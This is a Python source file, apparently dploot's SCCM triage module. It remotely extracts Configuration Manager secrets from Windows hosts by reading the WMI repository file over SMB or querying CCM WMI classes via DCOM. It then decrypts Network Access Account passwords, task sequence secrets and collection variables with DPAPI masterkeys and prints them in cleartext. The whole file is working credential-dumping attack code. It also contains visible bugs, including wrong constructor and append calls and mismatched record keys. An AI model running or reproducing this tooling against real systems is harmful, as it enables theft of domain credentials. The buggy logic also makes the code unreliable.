import logging
from typing import List, Tuple
import re

from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.triage.masterkeys import Masterkey
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcomrt import DCOMConnection

class SCCMCred:
    def __init__(self, username, password) -> None:
        self.username = username
        self.password = password

    def dump(self) -> None:
        print('[NAA Account]')
        print('\tUsername:\t%s' % self.username.decode('latin-1'))
        print('\tPassword:\t%s' % self.password.decode('latin-1'))


    def dump_quiet(self) -> None:
        print("[NAA] %s:%s" % (self.username.decode('latin-1'), self.password.decode('latin-1')))

class SCCMSecret:
    def __init__(self, type, secret) -> None:
        self.type = type
        self.secret = secret

    def dump(self) -> None:
        print('[Task sequences secret]')
        print('\tSecret:\t%s' % self.secret.decode('latin-1'))


    def dump_quiet(self) -> None:
        print("[Task] %s" % (self.secret.decode('latin-1')))  

class SCCMCollection:
    def __init__(self, variable, value) -> None:
        self.variable = variable
        self.value = value

    def dump(self) -> None:
        print('[Collection Variable]')
        print("\tName:\t%s" % self.variable.decode('latin-1'))
        print("\tValue:\t%s" % self.value.decode('latin-1'))


    def dump_quiet(self) -> None:
        print("[Collection] %s:%s" % (self.variable.decode('latin-1'), self.value.decode('latin-1')))

class SCCMTriage:

    sccm_objectdata_filepath = 'Windows\\System32\\wbem\\Repository\\OBJECTS.DATA'
    share = 'C$'

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: List[Masterkey], use_wmi: bool) -> None:
        self.target = target
        self.conn = conn
        self.use_wmi = use_wmi
        self.masterkeys = masterkeys


    def sccmdecrypt(self, dpapi_blob):
        if self.use_wmi:
            list_blob = [int(dpapi_blob[i:i+2],16) for i in range(0, len(dpapi_blob), 2)][4:]
        else:
            list_blob = list(bytes.fromhex(dpapi_blob.decode('utf-8')))[4:]
        blob_bytes = bytes(list_blob)
        
        masterkey = find_masterkey_for_blob(blob_bytes, masterkeys=self.masterkeys)
        result = ''
        if masterkey is not None:
            result = decrypt_blob(blob_bytes, masterkey=masterkey)
        else:
            logging.debug("Master keys not found for SCCM blob")
        return result

    def parseFile(self, objectfile) -> Tuple[List[SCCMCred], List[SCCMSecret], List[SCCMCollection]]:
        sccmcred = list()
        sccmsecret = list()
        sccmcollection = list()
        regex_naa = br"CCM_NetworkAccessAccount.*<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>.*<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>"
        regex_task = br"</SWDReserved>.*<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>"
        regex_collection = br"CCM_CollectionVariable\x00\x00(.*?)\x00\x00.*<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>"
        logging.debug("Looking for NAA Credentials from OBJECTS.DATA file")
        pattern = re.compile(regex_naa)
        for match in pattern.finditer(objectfile):
            logging.debug("Found NAA Credentials from OBJECTS.DATA file")
            password = self.sccmdecrypt(match.group(1))
            username = self.sccmdecrypt(match.group(2))
            sccmcred.append(SCCMCred(username, password))
        pattern = re.compile(regex_task)
        logging.debug("Looking for task sequences secret from OBJECTS.DATA file")
        for match in pattern.finditer(objectfile):
            logging.debug("Found task sequences secret from OBJECTS.DATA file")
            secret = self.sccmdecrypt(match.group(1))
            sccmsecret.append(SCCMSecret(secret))
        pattern = re.compile(regex_collection)
        logging.debug("Looking for collection variables from OBJECTS.DATA file")
        for match in pattern.finditer(objectfile):
            logging.debug("Found collection variable from OBJECTS.DATA file")
            name = self.sccmdecrypt(match.group(1))
            value = self.sccmdecrypt(match.group(2))
            sccmcollection.append(SCCMCollection(name, value))
        return sccmcred, sccmsecret, sccmcollection
    
    def parseReply(self, iEnum):
            finding = list()
            regex = r"<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>"
            while True:
                try:
                    pEnum = iEnum.Next(0xffffffff,1)[0]
                    record = pEnum.getProperties()

                    if 'NetworkAccessUsername' in record and 'NetworkAccessPassword' in record and len(record['NetworkAccessUsername']['value']) > 0 and len(record['NetworkAccessPassword']['value']) > 0:
                        logging.debug("Found NAA Credentials using WMI")
                        username = self.sccmdecrypt(re.match(regex, record['NetworkAccessUsername']['value']).group(1))
                        password = self.sccmdecrypt(re.match(regex, record['NetworkAccessPassword']['value']).group(1))
                        finding.append(SCCMCred(username, password))
                    if 'Name' in record and 'Value' in record and len(record['Name']['value']) > 0 and len(record['value']['value']) > 0:
                        logging.debug("Found collection variables using WMI")
                        name = self.sccmdecrypt(re.match(regex, record['name']['value']).group(1))
                        value = self.sccmdecrypt(re.match(regex, record['value']['value']).group(1))
                        finding.append(SCCMCollection(name, value))
                    if 'TS_Sequence' in record and len(record['TS_Sequence']['value']) > 0:
                        logging.debug("Found task sequences secret using WMI")
                        secret = self.sccmdecrypt(re.match(regex, record['TS_Sequence']['value']).group(1))
                        finding.append(SCCMSecret, secret)
                except Exception as e:
                    if str(e).find('S_FALSE') > 0:
                        break
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                        raise
                    else:
                        break
            iEnum.RemRelease()
            return finding


    def LocalSecretsWmi(self) -> Tuple[List[SCCMCred], List[SCCMSecret], List[SCCMCollection]]:
        sccmcred=list()
        sccmtask=list()
        sccmcollection=list()
        namespace = 'root\\ccm\\Policy\\Machine\\RequestedConfig'
        query_naa = 'SELECT NetworkAccessUsername, NetworkAccessPassword FROM CCM_NetworkAccessAccount'
        query_task = 'SELECT TS_Sequence FROM CCM_TaskSequence'
        query_collection = 'SELECT Name, Value FROM CCM_CollectionVariable'
        try:
            dcom = DCOMConnection(self.target.address, self.target.username, self.target.password, self.target.domain, self.target.lmhash, self.target.nthash, self.target.aesKey, oxidResolver=True, doKerberos=self.target.do_kerberos, kdcHost=self.target.dc_ip)
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
            iWbemLevel1Login.RemRelease()
            logging.debug("Query WMI for Network access accounts")
            iEnumWbemClassObject = iWbemServices.ExecQuery(query_naa)
            sccmcred = self.parseReply(iEnumWbemClassObject)
            logging.debug("Query WMI for Task sequences")
            iEnumWbemClassObject = iWbemServices.ExecQuery(query_task)
            sccmtask = self.parseReply(iEnumWbemClassObject)
            logging.debug("Query WMI for collection variables")
            iEnumWbemClassObject = iWbemServices.ExecQuery(query_collection)
            sccmcollection = self.parseReply(iEnumWbemClassObject)
            iEnumWbemClassObject.RemRelease()
        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
                logging.debug(str(e))
        dcom.disconnect()
        return sccmcred, sccmtask, sccmcollection
    
    def triage_sccm(self) -> Tuple[List[SCCMCred], List[SCCMSecret], List[SCCMCollection]]:
        sccmcred=list()
        sccmtask=list()
        sccmcollection=list()
        try:
            if self.use_wmi:
                sccmcred, sccmtask, sccmcollection = self.LocalSecretsWmi()
            else:
                objectfile = self.conn.readFile(self.share,self.sccm_objectdata_filepath, bypass_shared_violation = True)
                if (objectfile is not None and len(objectfile) > 0):
                    sccmcred, sccmtask, sccmcollection = self.parseFile(objectfile)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
                logging.debug(str(e))
            pass
        return sccmcred, sccmtask, sccmcollection
    


 
